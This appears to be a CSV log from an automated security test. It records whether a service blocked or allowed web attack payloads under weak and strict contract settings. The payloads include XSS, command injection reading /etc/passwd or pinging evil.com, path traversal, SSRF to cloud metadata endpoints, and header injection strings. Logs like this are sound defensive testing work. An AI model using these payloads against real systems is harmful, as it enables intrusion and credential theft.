timestamp,attack_type,description,payload,contract_type,result,http_status,response_body
2025-10-12T18:06:49.697823,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:49.703970,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:49.809904,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:49.816038,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:49.923872,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:49.929776,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.038560,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:06:50.045083,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:06:50.153602,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.157980,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.265690,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.271916,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.380085,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.387005,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.491943,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.494778,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.601245,Cmd Injection,Simple Pipe,| whoami,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.606375,Cmd Injection,Simple Pipe,| whoami,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.712252,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:06:50.715683,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:06:50.823321,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:06:50.829690,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:06:50.937889,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:50.944200,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.052141,Cmd Injection,Backticks,`uname -a`,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:06:51.057053,Cmd Injection,Backticks,`uname -a`,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:06:51.164930,Cmd Injection,Command Substitution,$(reboot),Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.170693,Cmd Injection,Command Substitution,$(reboot),Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.278874,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.285998,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.393342,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T18:06:51.398307,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T18:06:51.501798,Path Traversal,Root Directory,/etc/shadow,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.507140,Path Traversal,Root Directory,/etc/shadow,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.615392,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.621823,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.730709,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.737146,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.846514,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.852619,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:51.961484,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T18:06:51.968183,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T18:06:52.077383,SSRF,Localhost,http://localhost/admin,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.083540,SSRF,Localhost,http://localhost/admin,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.192769,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.198615,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.307957,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.313956,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.421210,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.427156,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.536056,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.541686,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.646223,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.652447,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.758715,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.765417,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.875794,Deserialization,Java RMI Header,JRMI,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:06:52.882254,Deserialization,Java RMI Header,JRMI,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
